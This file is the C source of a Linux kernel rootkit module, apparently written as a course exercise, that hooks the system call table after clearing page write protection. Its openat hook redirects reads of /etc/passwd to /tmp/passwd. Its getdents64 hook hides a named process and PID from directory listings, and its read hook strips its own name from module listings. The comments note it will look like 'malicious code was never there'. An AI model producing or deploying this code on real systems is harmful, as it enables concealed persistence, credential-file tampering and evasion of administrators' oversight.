#include <linux/module.h>      // for all modules 
#include <linux/init.h>        // for entry/exit macros 
#include <linux/kernel.h>      // for printk and other kernel bits 
#include <asm/current.h>       // process information
#include <linux/sched.h>
#include <linux/highmem.h>     // for changing page permissions
#include <asm/unistd.h>        // for system call constants
#include <linux/kallsyms.h>
#include <asm/page.h>
#include <asm/cacheflush.h>
#include <linux/dirent.h>

#define PREFIX "sneaky_process"

struct linux_dirent {
    unsigned long  d_ino;     /* Inode number */
    unsigned long  d_off;     /* Offset to next linux_dirent */
    unsigned short d_reclen;  /* Length of this linux_dirent */
    char           d_name[];  /* Filename (null-terminated) */
};
typedef struct linux_dirent linux_dirent_t; 

static char* pid = "";
module_param(pid, charp, 0);
MODULE_PARM_DESC(pid, "pid of sneaky module");

//This is a pointer to the system call table
static unsigned long *sys_call_table;

// Helper functions, turn on and off the PTE address protection mode
// for syscall_table pointer
int enable_page_rw(void *ptr){
  unsigned int level;
  pte_t *pte = lookup_address((unsigned long) ptr, &level);
  if(pte->pte &~_PAGE_RW){
    pte->pte |=_PAGE_RW;
  }
  return 0;
}

int disable_page_rw(void *ptr){
  unsigned int level;
  pte_t *pte = lookup_address((unsigned long) ptr, &level);
  pte->pte = pte->pte &~_PAGE_RW;
  return 0;
}

/**********************************************************************************************
 * sneaky function definition
 * 
 **********************************************************************************************/
/* -------------------- openat -------------------- */
/**
 * @brief functor to original openat
 * 
 */
asmlinkage int (*original_openat)(struct pt_regs *);

/**
 * @brief sneaky openat
 * 
 * @param regs 
 * @return asmlinkage 
 */
asmlinkage int sneaky_sys_openat(struct pt_regs *regs)
{
  if(strcmp((char*)(regs->si), "/etc/passwd") == 0){
    const char* tmpPasswdPath = "/tmp/passwd";
    copy_to_user((char*)(regs->si), tmpPasswdPath, strlen(tmpPasswdPath));
  }
  return (*original_openat)(regs);
}

/* -------------------- getdents -------------------- */
/**
 * @brief functor to original getdents64
 * 
 */
asmlinkage int(*original_getdents64)(struct pt_regs *regs);

/**
 * @brief sneaky getdents64
 * 
 * @param regs 
 * @return asmlinkage 
 */
asmlinkage int sneaky_sys_getdents64(struct pt_regs* regs){
  int totalDirpLength = original_getdents64(regs);
  struct linux_dirent64* dirp = (void*)(regs->si);

  int curr = 0;
  while(curr < totalDirpLength){
    struct linux_dirent64* dirpTemp = (void*)dirp + curr;
    if(strcmp(dirpTemp->d_name, "sneaky_process") == 0 || strcmp(dirpTemp->d_name, pid) == 0){
      int reclen = dirpTemp->d_reclen;
      int lenToBeCopied = ((void*)dirp + totalDirpLength) - ((void*)dirpTemp + reclen);
      void* source = (void*)dirpTemp + reclen;
      memmove((void*)(regs->si) + curr, source, lenToBeCopied);
      totalDirpLength -= reclen;
    }
    else{
      curr += dirpTemp->d_reclen;
    }
  }
  return totalDirpLength;
}

/* -------------------- read -------------------- */
/**
 * @brief functor to original read
 * 
 */
asmlinkage ssize_t (*original_read)(struct pt_regs*);

/**
 * @brief sneaky read
 * 
 * @param regs 
 * @return asmlinkage 
 */
asmlinkage ssize_t sneaky_sys_read(struct pt_regs *regs){
  ssize_t bytesRead = original_read(regs);

  if(bytesRead > 0){
    void* posStart = strnstr((char*)(regs->si), "sneaky_mod", bytesRead);
    if(posStart != NULL){
      void* posEnd = strnstr(posStart, "\n", bytesRead - (posStart - (void*)(regs->si)));
      if(posEnd != NULL){
        int size = posEnd - posStart + 1;
        memmove(posStart, posEnd + 1, bytesRead - (posStart - (void*)(regs->si)) - size);
        bytesRead -= size;
      }
    }
  }
  return bytesRead;
}

/**********************************************************************************************
 * kernel backbone
 * 
 **********************************************************************************************/
// The code that gets executed when the module is loaded
static int initialize_sneaky_module(void)
{
  // See /var/log/syslog or use `dmesg` for kernel print output
  printk(KERN_INFO "Sneaky module being loaded.\n");

  // Lookup the address for this symbol. Returns 0 if not found.
  // This address will change after rebooting due to protection
  sys_call_table = (unsigned long *)kallsyms_lookup_name("sys_call_table");

  // This is the magic! Save away the original 'openat' system call
  // function address. Then overwrite its address in the system call
  // table with the function address of our new code.
  original_openat = (void*)sys_call_table[__NR_openat];
  original_getdents64 = (void*)sys_call_table[__NR_getdents64];
  original_read = (void*)sys_call_table[__NR_read];
  
  // Turn off write protection mode for sys_call_table
  enable_page_rw((void *)sys_call_table);
  
  sys_call_table[__NR_openat] = (unsigned long)sneaky_sys_openat;
  sys_call_table[__NR_getdents64] = (unsigned long)sneaky_sys_getdents64;
  sys_call_table[__NR_read] = (unsigned long)sneaky_sys_read;
  
  // Turn write protection mode back on for sys_call_table
  disable_page_rw((void *)sys_call_table);

  return 0;       // to show a successful load 
}  


static void exit_sneaky_module(void) 
{
  printk(KERN_INFO "Sneaky module being unloaded.\n"); 

  // Turn off write protection mode for sys_call_table
  enable_page_rw((void *)sys_call_table);

  // This is more magic! Restore the original 'open' system call
  // function address. Will look like malicious code was never there!
  sys_call_table[__NR_openat] = (unsigned long)original_openat;
  sys_call_table[__NR_getdents64] = (unsigned long)original_getdents64;
  sys_call_table[__NR_read] = (unsigned long)original_read;

  // Turn write protection mode back on for sys_call_table
  disable_page_rw((void *)sys_call_table);  
}  


module_init(initialize_sneaky_module);  // what's called upon loading 
module_exit(exit_sneaky_module);        // what's called upon unloading  
MODULE_LICENSE("GPL");